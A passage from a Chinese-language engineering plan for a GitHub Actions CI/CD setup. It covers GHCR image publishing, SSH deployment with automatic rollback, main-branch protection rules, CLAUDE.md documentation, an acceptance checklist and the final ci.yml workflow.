**⑩ 短期凭据（K27）**。服务器要从 GHCR 拉镜像，需要登录。这里没有在服务器上存一个长期有效的令牌，而是把本次 job 的 `GITHUB_TOKEN` 通过 stdin 传给服务器上的 `docker login`，部署完立刻 `docker logout`。`GITHUB_TOKEN` 在 job 结束时就失效了，即使服务器上的登录信息被人读走，也已经没用了。通过 stdin 传入（`--password-stdin`），令牌不会出现在命令行参数里，也就不会被 `ps` 看到。

**⑪ SC2029 注释**。shellcheck 会提醒：ssh 命令字符串里的变量是在 runner 上展开的，而不是在服务器上。这里本来就是要在本地展开，把镜像名传过去；前提是这些值都可信：镜像名刚刚校验过，GitHub 用户名的字符集也有限制。所以用注释标明「这是有意为之」，而不是改个写法去绕过检查。

- [ ] **Step 2: 本地检查**

```bash
actionlint
git add .github/workflows/release.yml
git commit -m "feat: 新增发布流水线（检查 → 推送镜像到 GHCR → SSH 部署，失败自动回滚）"
git push origin backend
```

Expected: actionlint 没有输出。

- [ ] **Step 3: 第一次发布**

合并 `backend → main` 的 PR。打开 Actions → Release，Expected:
1. 「检查与测试」「构建并推送镜像」「部署到生产环境」三个 job 依次变绿（如果设置了 Required reviewers，部署前会停下来等你批准）
2. 仓库主页右侧的 **Packages** 里出现 `question_set_program`，里面有 `sha-xxxxxxx` 和 `latest` 两个标签
3. 部署 job 的摘要里写着部署的镜像名

到服务器上确认：

```bash
cd /opt/question_set_program
docker compose ps                                 # app 的状态是 running (healthy)
curl -s http://127.0.0.1:8000/health/ready        # {"status":"ok","checks":{"redis":"ok","database":"ok"}}
cat .current_image                                # 与部署的镜像一致
```

**这是这份计划第一次真正执行部署。** 常见的失败原因：
- `Host key verification failed`：`DEPLOY_KNOWN_HOSTS` 不对，重做 Task 11 Step 4 的指纹获取
- `Permission denied (publickey)`：公钥没加到 `authorized_keys`，或者那个文件的权限太宽（应为 600，`.ssh` 目录应为 700）
- `denied: permission_denied`（拉镜像时）：到 GHCR 包的设置页 → Manage Actions access，确认这个仓库有访问权限
- 就绪检查一直失败：看部署日志里打印出来的容器日志；最常见的原因是 `.env` 里的 MySQL 或 Redis 地址在容器里连不通（见 Task 11 Step 3）

- [ ] **Step 4: 演练一次回滚**

**知识点**：K20 自动回滚

一个没有演练过的回滚方案，不能算作回滚方案。在第二次发布成功之后：

1. Actions → Release → Run workflow，`image_tag` 填第一次发布的标签（在 Packages 里能查到）
2. Expected: 「检查与测试」和「构建并推送镜像」显示为跳过，「部署到生产环境」成功
3. 在服务器上执行 `cat .current_image`，确认已经变回旧版本
4. 再运行一次，填最新的标签，恢复到最新版本

---

## Task 13: 分支保护与文档

**Files:**
- Modify: `CLAUDE.md`（新增一节）

- [ ] **Step 1: 保护 main 分支**

**知识点**：K28 分支保护与必需检查

GitHub 仓库 → Settings → Rules → Rulesets → New branch ruleset：

1. Target branches：Include default branch（也就是 main）
2. 勾选 **Restrict deletions** 和 **Block force pushes**
3. 勾选 **Require a pull request before merging**
4. 勾选 **Require status checks to pass**，添加这四个检查：`静态检查`、`后端测试`、`前端构建`、`镜像构建检查`

检查的名称就是 job 的 `name`。一个检查至少运行过一次，才能在列表里搜到它，所以要在 Task 8 的 PR 跑过之后再做这一步。`Security` 不要加进去，原因见 Task 10。

设置好之后，试着直接往 main 推送一个提交，Expected: 被拒绝，提示需要通过 PR。

- [ ] **Step 2: 更新 CLAUDE.md**

> 以部署计划 Task 9 Step 2 的版本为准，那一版包含了部署相关的内容。下面这一版只作参考，不要重复添加。

在 `CLAUDE.md` 末尾加入：

````markdown
## CI/CD（GitHub Actions）

| Workflow | 触发 | 做什么 |
|---|---|---|
| `.github/workflows/ci.yml` | 指向 main 的 PR；推送到 main 以外的分支（涉及代码时）；被 release.yml 调用 | 静态检查（ruff、shellcheck、hadolint、actionlint）、带 Redis 的后端测试、前端构建；PR 上另外检查镜像能否构建 |
| `.github/workflows/release.yml` | 推送到 main；手动运行（回滚） | 调用 ci.yml → 构建镜像推送到 GHCR → SSH 部署到生产环境，就绪检查失败自动回滚 |
| `.github/workflows/security.yml` | 每周一；requirements.txt 变更；手动 | pip-audit 依赖漏洞扫描，结果写进运行摘要（不阻塞合并） |
| `.github/dependabot.yml` | 每周或每月 | 依赖、Action、基础镜像、npm 包的更新 PR，发往 backend 分支 |

本地跑一遍和 CI 相同的检查：

```bash
pip install -r backend/requirements-tools.txt actionlint-py
cd backend && ruff check . && cd ..
shellcheck deploy/*.sh && hadolint Dockerfile && actionlint
bash deploy/test_deploy.sh
```

约定：
- 新增必填配置项时，同步更新 `backend/.env.example`、`ci.yml` 里的占位 `env`、服务器上的 `.env`
- 测试不能依赖开发机上的 `.env`：读取配置的测试用 `backend/tests/isolation.py` 在子进程里运行
- CI 设置了 `REQUIRE_REDIS=1`，Redis 连不上时测试失败，而不是跳过
- 镜像标签是 `sha-<7位提交号>`，部署和回滚只用这个不可变标签，`latest` 只用于查看
- JWT 密钥来自 `JWT_SECRET_KEY`，缺失时服务拒绝启动
- 回滚：Actions → Release → Run workflow，填上一个成功版本的标签；紧急时也可以登录服务器执行 `bash /opt/question_set_program/deploy.sh <镜像>`
- 服务从仓库根目录启动：`python -m uvicorn backend.main:app`（代码都是 `backend.*` 绝对导入）
````

- [ ] **Step 3: 提交**

```bash
git add CLAUDE.md
git commit -m "docs: CLAUDE.md 补充 CI/CD 流程与约定"
```

---

## 验收对照表

| # | 要求 | 由谁保证 | 怎么确认 |
|---|---|---|---|
| R1 | 提交与 PR 自动检查 | Task 7 `ci.yml` | PR 页面有四个检查 |
| R2 | Redis 不可用时失败 | Task 2 + `REQUIRE_REDIS: "1"` | `test_redis_policy.py`；CI 日志里 Redis 测试都是 PASSED |
| R3 | 测试不依赖本机配置 | Task 1、Task 7 的占位 `env` | 删掉 `.env` 后测试照样通过；CI 通过 |
| R4 | PR 上检查镜像 | Task 8 `image` job | PR 页面的「镜像构建检查」 |
| R5 | 合并即发布 | Task 12 | Actions → Release 三个 job 依次通过；Packages 里有新标签 |
| R6 | 就绪检查与自动回滚 | Task 6、Task 9 `deploy.sh` | `test_deploy.sh` 用例 2、3 |
| R7 | 手动回滚 | Task 12 `workflow_dispatch` | Task 12 Step 4 的演练 |
| R8 | 密钥最小暴露 | Task 3、8、11、12 | 代码里没有密钥（`test_security.py`）；`.dockerignore` 排除 `.env`；GHCR 用的是 job 期间有效的令牌 |
| R9 | 漏洞扫描与自动更新 | Task 10 | Security 的运行摘要；Dependabot 发来的 PR |
| R10 | main 分支受保护 | Task 13 | 直接推送 main 会被拒绝 |

---

## 附录 A：最终版 `ci.yml`

Task 7、8、9 分步写成的 `ci.yml`，合在一起应当与下面完全一致：

```yaml
name: CI

on:
  pull_request:
    branches: [main]
  push:
    branches-ignore: [main]      # main 的推送由 release.yml 负责，它会先调用本 workflow 跑一遍检查
    paths:
      - "backend/**"
      - "frontend/**"
      - "deploy/**"
      - "Dockerfile"
      - ".dockerignore"
      - ".github/workflows/**"
  workflow_call:                 # 允许 release.yml 以 uses: ./.github/workflows/ci.yml 调用

permissions:
  contents: read                 # 默认最小权限：只读代码；需要更多权限的 job 单独声明

concurrency:
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  PYTHON_VERSION: "3.14"

jobs:
  lint:
    name: 静态检查
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: pip
          cache-dependency-path: backend/requirements-tools.txt

      - name: 安装检查工具
        run: pip install -r backend/requirements-tools.txt

      - name: ruff（Python 代码）
        working-directory: backend
        run: ruff check --output-format=github .

      - name: shellcheck（部署脚本）
        run: shellcheck deploy/*.sh

      - name: hadolint（Dockerfile）
        run: hadolint Dockerfile

      - name: actionlint（workflow 文件本身）
        env:
          ACTIONLINT_VERSION: 1.7.12
          ACTIONLINT_SHA256: 8aca8db96f1b94770f1b0d72b6dddcb1ebb8123cb3712530b08cc387b349a3d8
        run: |
          curl -sSfL -o actionlint.tar.gz \
            "https://github.com/rhysd/actionlint/releases/download/v${ACTIONLINT_VERSION}/actionlint_${ACTIONLINT_VERSION}_linux_amd64.tar.gz"
          echo "${ACTIONLINT_SHA256}  actionlint.tar.gz" | sha256sum -c -
          tar -xzf actionlint.tar.gz actionlint
          ./actionlint -color

  test:
    name: 后端测试
    runs-on: ubuntu-latest
    timeout-minutes: 20
    services:
      redis:
        image: redis:7-alpine
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
          --health-timeout 3s
          --health-retries 10
    env:
      REQUIRE_REDIS: "1"                  # Redis 连不上就失败，不许静默跳过
      REDIS_HOST: localhost
      REDIS_PORT: "6379"
      # 下面都是占位值：测试不连 MySQL、不调大模型，只为满足模块导入时的配置检查
      SQL_DATABASE_URL: mysql+asyncmy://ci:ci@127.0.0.1:3306/ci
      API_KEY: ci-placeholder
      API_URL: http://127.0.0.1:9/v1
      MODEL_NAME: ci-model
      EMBEDDING_MODEL: ci-embedding
      JWT_SECRET_KEY: ci-placeholder-secret
      ANONYMIZED_TELEMETRY: "False"
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-python@v7
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: pip
          cache-dependency-path: backend/requirements.txt

      - name: 安装依赖
        run: pip install -r backend/requirements.txt

      - name: 运行测试
        working-directory: backend
        run: >-
          python -m pytest -v -rs
          --cov --cov-report=term-missing:skip-covered --cov-report=xml:coverage.xml
          --junitxml=junit.xml

      - name: 覆盖率写入运行摘要
        if: always()
        working-directory: backend
        run: |
          if [ -f .coverage ]; then
            echo "## 后端覆盖率" >> "$GITHUB_STEP_SUMMARY"
            python -m coverage report --format=markdown >> "$GITHUB_STEP_SUMMARY"
          fi

      - name: 上传测试报告
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: backend-test-reports
          path: |
            backend/junit.xml
            backend/coverage.xml
          if-no-files-found: ignore
          retention-days: 14

      - name: 部署脚本的测试
        run: bash deploy/test_deploy.sh

  frontend:
    name: 前端构建
    runs-on: ubuntu-latest
    timeout-minutes: 10
    defaults:
      run:
        working-directory: frontend
    steps:
      - uses: actions/checkout@v7

      - uses: actions/setup-node@v7
        with:
          node-version: "24"
          cache: npm
          cache-dependency-path: frontend/package-lock.json

      - run: npm ci
      - run: npm run build

  image:
    name: 镜像构建检查
    # 只在 PR 上检查 Dockerfile 能不能构建、镜像能不能启动；合并到 main 后由 release.yml 构建并推送
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    timeout-minutes: 30
    steps:
      - uses: actions/checkout@v7

      - uses: docker/setup-buildx-action@v4

      - name: 构建镜像（不推送）
        uses: docker/build-push-action@v7
        with:
          context: .
          push: false
          load: true                      # 把镜像加载进本机 Docker，下一步才能 docker run
          tags: question-set-program:ci
          cache-from: type=gha
          cache-to: type=gha,mode=max

      - name: 镜像冒烟测试：能导入应用
        run: >-
          docker run --rm
          -e SQL_DATABASE_URL=mysql+asyncmy://ci:ci@127.0.0.1:3306/ci
          -e API_KEY=ci-placeholder -e API_URL=http://127.0.0.1:9/v1
          -e JWT_SECRET_KEY=ci-placeholder-secret
          question-set-program:ci
          python -c "import backend.main; print('镜像内应用导入成功')"
```
